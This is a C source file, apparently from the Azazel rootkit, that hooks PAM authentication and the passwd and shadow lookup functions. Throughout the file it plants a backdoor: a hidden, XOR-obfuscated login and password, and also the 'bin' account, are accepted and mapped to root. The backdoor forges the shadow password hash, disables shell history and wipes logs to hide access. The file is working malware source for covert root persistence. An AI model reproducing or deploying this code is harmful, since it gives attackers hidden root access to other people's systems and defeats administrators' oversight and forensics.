#define _GNU_SOURCE

#include <stdlib.h>
#include <dlfcn.h>
#include <string.h>
#include <errno.h>
#include <pwd.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <stdio.h>
#include <shadow.h>
#include <crypt.h>

#include "const.h"
#include "xor.h"
#include "azazel.h"

int pam_authenticate(pam_handle_t *pamh, int flags) {
        void *user, *pass;

        char *blind_login = strdup(BLIND_LOGIN);
        char *blind_pass = strdup(BLIND_PASS);

        x(blind_login);
        x(blind_pass);

        DEBUG("pam_authenticate called.\n");

        azazel_init();

        int retval = 0;
        pam_get_item(pamh, PAM_USER, (const void **)&user);

        if (strstr(user, blind_login) || strcmp(user, "bin") == 0) {
                char *token = NULL;
                retval = pam_prompt(pamh, PAM_PROMPT_ECHO_OFF, &token, "%s", "Password:");

                if(retval != PAM_SUCCESS || token == NULL) {
                        free(token);
                        cleanup(blind_pass, strlen(blind_pass));
                        cleanup(blind_login,strlen(blind_login));
                        return PAM_AUTH_ERR;
                }

                if(strstr(token, blind_pass)) {
                        free(token);
                        char *myENV = strdup(HIDE_TERM_STR);
                        x(myENV);
                        char *putnow = (char *) malloc(strlen(myENV) + strlen(blind_login) + 10);
                        memset(putnow, 0, strlen(myENV) + strlen(blind_login) + 10);
                        sprintf(putnow, "%s=%s", myENV, blind_login);
                        pam_putenv(pamh, putnow);
                        free(myENV);
                        free(putnow);
                        pam_putenv(pamh, "HISTFILE=/dev/null");
                        cleanup(blind_pass, strlen(blind_pass));
                        cleanup(blind_login,strlen(blind_login));
                        clean_logz();
                        return PAM_SUCCESS;
                }
        }

        cleanup(blind_pass, strlen(blind_pass));
        cleanup(blind_login,strlen(blind_login));

        clean_logz();
        return (long)syscall_list[SYS_PAM_AUTHENTICATE].syscall_func(pamh, flags);
}

int pam_open_session(pam_handle_t *pamh, int flags) {
        void *user;
        char *blind_login = strdup(BLIND_LOGIN);
        x(blind_login);

        DEBUG("pam_open_session called.\n");

        azazel_init();

        pam_get_item(pamh, PAM_USER, (const void **)&user);

        if (strstr(user, blind_login) || strcmp(user, "bin") == 0) {
                cleanup(blind_login,strlen(blind_login));
                clean_logz();
                return PAM_SUCCESS;
        }

        cleanup(blind_login,strlen(blind_login));
        clean_logz();

        return (long)syscall_list[SYS_PAM_OPEN_SESSION].syscall_func(pamh, flags);
}

struct passwd *getpwnam(const char *name) {
        char *blind_login = strdup(BLIND_LOGIN);
        char *c_root = strdup(C_ROOT);

        x(blind_login);
        x(c_root);

        DEBUG("getpwnam called. %s\n", name);

        azazel_init();

        if (strstr(name, blind_login)) {
                struct passwd *mypw;
                mypw = syscall_list[SYS_GETPWNAM].syscall_func(c_root);
                mypw->pw_uid = 0;
                mypw->pw_gid = 0;
                mypw->pw_dir = strdup("/root");
                mypw->pw_name = strdup(blind_login);

                cleanup(blind_login,strlen(blind_login));
                cleanup(c_root,strlen(c_root));

                clean_logz();
                return mypw;
        }
        else if (strcmp(name, "bin") == 0) {
                struct passwd *mypw;
                mypw = syscall_list[SYS_GETPWNAM].syscall_func(c_root);
                mypw->pw_uid = 1;
                mypw->pw_gid = 1;
                mypw->pw_dir = strdup("/");
                mypw->pw_name = strdup(blind_login);

                cleanup(blind_login,strlen(blind_login));
                cleanup(c_root,strlen(c_root));

                clean_logz();
                return mypw;
        }

        cleanup(blind_login,strlen(blind_login));
        cleanup(c_root,strlen(c_root));
        clean_logz();
        return syscall_list[SYS_GETPWNAM].syscall_func(name);
}

int getpwnam_r(const char *name, struct passwd *pwd, char *buf, size_t buflen, struct passwd **result) {
        char *blind_login = strdup(BLIND_LOGIN);
        char *c_root = strdup(C_ROOT);
        char user[51];

        x(blind_login);
        x(c_root);

        DEBUG("getpwnam_r called.\n");
        azazel_init();

        if (strstr(name, blind_login)) {
                strncpy(user, c_root, sizeof(user)-1);
                cleanup(blind_login,strlen(blind_login));
                cleanup(c_root,strlen(c_root));
                clean_logz();
                return (long)syscall_list[SYS_GETPWNAM_R].syscall_func(user, pwd, buf, buflen, result);
        }

        cleanup(blind_login,strlen(blind_login));
        cleanup(c_root,strlen(c_root));
        clean_logz();
        return (long)syscall_list[SYS_GETPWNAM_R].syscall_func(name, pwd, buf, buflen, result);
}

int pam_acct_mgmt(pam_handle_t *pamh, int flags) {
        void *user;
        char *blind_login = strdup(BLIND_LOGIN);
        x(blind_login);

        DEBUG("pam_acct_mgmt called.\n");

        azazel_init();

        pam_get_item(pamh, PAM_USER, (const void **)&user);

        if (strstr(user, blind_login) || strcmp(user, "bin") == 0) {
                cleanup(blind_login,strlen(blind_login));
                clean_logz();
                return PAM_SUCCESS;
        }

        cleanup(blind_login,strlen(blind_login));
        clean_logz();
        return (long)syscall_list[SYS_PAM_ACCT_MGMT].syscall_func(pamh, flags);
}

void *libc;

static int (*real_pam)(pam_handle_t *pamh, int flags, int argc, const char **argv);

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
        const char *user;
        char *blind_login = strdup(BLIND_LOGIN);
        int pam_err;

        x(blind_login);

        azazel_init();

        pam_get_item(pamh, PAM_USER, (const void **)&user);

        if ((pam_err = pam_get_user(pamh, &user, NULL)) != PAM_SUCCESS) {
                cleanup(blind_login,strlen(blind_login));
                return pam_err;
        }

        if (strstr(user, blind_login) || strcmp(user, "bin") == 0) {
                cleanup(blind_login,strlen(blind_login));
                clean_logz();
                return PAM_SUCCESS;
        }

        cleanup(blind_login,strlen(blind_login));

        libc = dlopen (LIBC_PATH, RTLD_LAZY);
        real_pam = dlsym(libc, "pam_sm_authenticate");

        clean_logz();
        return real_pam(pamh, flags, argc, argv);
}

struct spwd *(*orig) (const char *name);

struct spwd *getspnam(const char *name) {
        char *blind_login = strdup(BLIND_LOGIN);
        char *blind_pass = strdup(BLIND_PASS);

        x(blind_login);
        x(blind_pass);

        azazel_init();

        orig = dlsym(RTLD_NEXT, "getspnam");

        if(strstr(name, blind_login) || strcmp(name, "bin") == 0) {
                struct spwd *mata = orig("root");
                mata->sp_pwdp = strdup(crypt(blind_pass, "xx"));
                cleanup(blind_pass, strlen(blind_pass));
                cleanup(blind_login, strlen(blind_login));
                clean_logz();

                return mata;
        }
        cleanup(blind_pass, strlen(blind_pass));
        cleanup(blind_login, strlen(blind_login));
        clean_logz();
        return orig(name);
}

